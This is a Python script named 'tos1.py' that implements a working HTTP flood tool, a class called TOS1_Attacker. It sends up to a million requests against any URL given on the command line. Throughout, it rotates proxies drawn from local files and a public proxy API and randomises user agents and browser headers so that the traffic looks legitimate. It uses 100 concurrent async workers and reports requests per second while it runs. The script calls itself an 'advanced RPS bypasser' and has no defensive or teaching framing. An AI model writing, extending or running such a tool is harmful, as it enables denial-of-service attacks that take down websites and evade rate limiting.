import asyncio
import aiohttp
import random
import time
from datetime import datetime
from urllib.parse import urlparse

class TOS1_Attacker:
    def __init__(self, target_url, request_limit=1000000):
        self.target_url = target_url
        self.request_limit = request_limit
        self.total_requests = 0
        self.successful_requests = 0
        self.failed_requests = 0
        self.start_time = time.time()
        
        # Load resources
        self.proxy_list = self.load_proxies()
        self.user_agents = self.load_user_agents()
        
        # Performance tracking
        self.rps_history = []
        self.current_rps = 0
        
    def load_proxies(self):
        """Load proxies from files and API"""
        proxies = []
        
        # Load from local files
        for filename in ['h1.txt', 'h2.txt']:
            try:
                with open(filename, 'r') as f:
                    for line in f:
                        proxy = line.strip()
                        if proxy and ':' in proxy:
                            proxies.append(f"http://{proxy}")
                print(f"[+] Loaded proxies from {filename}")
            except FileNotFoundError:
                print(f"[-] {filename} not found, skipping")
        
        # Fetch from free API
        try:
            import requests
            api_url = "https://www.proxy-list.download/api/v1/get?type=http"
            response = requests.get(api_url, timeout=10)
            if response.status_code == 200:
                api_proxies = response.text.strip().split('\n')
                for proxy in api_proxies:
                    if proxy and ':' in proxy:
                        proxies.append(f"http://{proxy}")
                print(f"[+] Loaded {len(api_proxies)} proxies from API")
        except Exception as e:
            print(f"[-] Failed to fetch from API: {e}")
        
        print(f"[+] Total proxies loaded: {len(proxies)}")
        return proxies
    
    def load_user_agents(self):
        """Load user agents from file"""
        user_agents = []
        try:
            with open('ua.txt', 'r') as f:
                user_agents = [line.strip() for line in f if line.strip()]
            print(f"[+] Loaded {len(user_agents)} user agents")
        except FileNotFoundError:
            # Default user agents if file not found
            user_agents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
            ]
            print("[+] Using default user agents")
        
        return user_agents
    
    def get_random_proxy(self):
        """Get random proxy from loaded list"""
        if not self.proxy_list:
            return None
        return random.choice(self.proxy_list)
    
    def get_random_user_agent(self):
        """Get random user agent"""
        return random.choice(self.user_agents)
    
    def calculate_rps(self):
        """Calculate current RPS"""
        current_time = time.time()
        elapsed = current_time - self.start_time
        if elapsed > 0:
            return self.total_requests / elapsed
        return 0
    
    def print_stats(self):
        """Display current statistics"""
        elapsed = time.time() - self.start_time
        hours = int(elapsed // 3600)
        minutes = int((elapsed % 3600) // 60)
        seconds = int(elapsed % 60)
        
        self.current_rps = self.calculate_rps()
        self.rps_history.append(self.current_rps)
        
        print(f"\n{'='*50}")
        print(f"TØS-1 STATUS | {hours:02d}:{minutes:02d}:{seconds:02d}")
        print(f"{'='*50}")
        print(f"TOTAL REQUESTS: {self.total_requests:,}")
        print(f"SUCCESSFUL: {self.successful_requests:,}")
        print(f"FAILED: {self.failed_requests:,}")
        print(f"CURRENT RPS: {self.current_rps:.1f}")
        print(f"PROXIES AVAILABLE: {len(self.proxy_list)}")
        print(f"UAs AVAILABLE: {len(self.user_agents)}")
        print(f"{'='*50}")
    
    async def make_request(self, session, proxy):
        """Make a single request through proxy"""
        headers = {
            'User-Agent': self.get_random_user_agent(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        }
        
        try:
            async with session.get(
                self.target_url, 
                headers=headers, 
                proxy=proxy,
                timeout=10,
                ssl=False
            ) as response:
                self.total_requests += 1
                if response.status in [200, 201, 202, 204]:
                    self.successful_requests += 1
                    return True
                else:
                    self.failed_requests += 1
                    return False
        except Exception as e:
            self.total_requests += 1
            self.failed_requests += 1
            return False
    
    async def attack_worker(self, worker_id, requests_per_worker):
        """Worker function for making requests"""
        print(f"[+] Worker {worker_id} started")
        
        requests_made = 0
        while requests_made < requests_per_worker and self.total_requests < self.request_limit:
            proxy = self.get_random_proxy()
            if not proxy:
                await asyncio.sleep(0.1)
                continue
            
            connector = aiohttp.TCPConnector(limit=100, ssl=False)
            timeout = aiohttp.ClientTimeout(total=10)
            
            async with aiohttp.ClientSession(
                connector=connector, 
                timeout=timeout
            ) as session:
                success = await self.make_request(session, proxy)
            
            # Adaptive delay based on success rate
            if not success and random.random() > 0.7:
                await asyncio.sleep(0.05)
            
            requests_made += 1
            
            # Print stats every 1000 requests
            if self.total_requests % 1000 == 0:
                self.print_stats()
        
        print(f"[+] Worker {worker_id} finished ({requests_made} requests)")
    
    async def run_attack(self, num_workers=100):
        """Main attack function"""
        print(f"\n{'#'*60}")
        print(f"TØS-1 ADVANCED RPS BYPASSER")
        print(f"Target: {self.target_url}")
        print(f"Workers: {num_workers}")
        print(f"Proxies: {len(self.proxy_list)}")
        print(f"{'#'*60}\n")
        
        # Calculate requests per worker
        requests_per_worker = self.request_limit // num_workers
        
        # Create worker tasks
        tasks = []
        for i in range(num_workers):
            task = asyncio.create_task(self.attack_worker(i, requests_per_worker))
            tasks.append(task)
        
        # Wait for all workers to complete
        await asyncio.gather(*tasks)
        
        # Final stats
        self.print_stats()
        total_time = time.time() - self.start_time
        avg_rps = self.total_requests / total_time if total_time > 0 else 0
        
        print(f"\n{'#'*60}")
        print(f"ATTACK COMPLETE")
        print(f"Total Time: {total_time:.2f} seconds")
        print(f"Average RPS: {avg_rps:.1f}")
        print(f"Success Rate: {(self.successful_requests/self.total_requests*100):.1f}%")
        print(f"{'#'*60}")

# Main execution
if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python tos1.py <target_url> [num_workers] [request_limit]")
        print("Example: python tos1.py https://example.com 100 100000")
        sys.exit(1)
    
    target_url = sys.argv[1]
    num_workers = int(sys.argv[2]) if len(sys.argv) > 2 else 100
    request_limit = int(sys.argv[3]) if len(sys.argv) > 3 else 1000000
    
    attacker = TOS1_Attacker(target_url, request_limit)
    
    # Create necessary files if they don't exist
    for filename in ['h1.txt', 'h2.txt', 'ua.txt']:
        try:
            open(filename, 'r').close()
        except FileNotFoundError:
            print(f"[!] {filename} not found, please create it")
            if filename == 'ua.txt':
                with open('ua.txt', 'w') as f:
                    f.write("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\n")
                    f.write("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36\n")
                    f.write("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36\n")
                print(f"[+] Created sample {filename}")
    
    # Run the attack
    try:
        asyncio.run(attacker.run_attack(num_workers))
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
        attacker.print_stats()
    except Exception as e:
        print(f"\n[!] Error: {e}")
        attacker.print_stats()
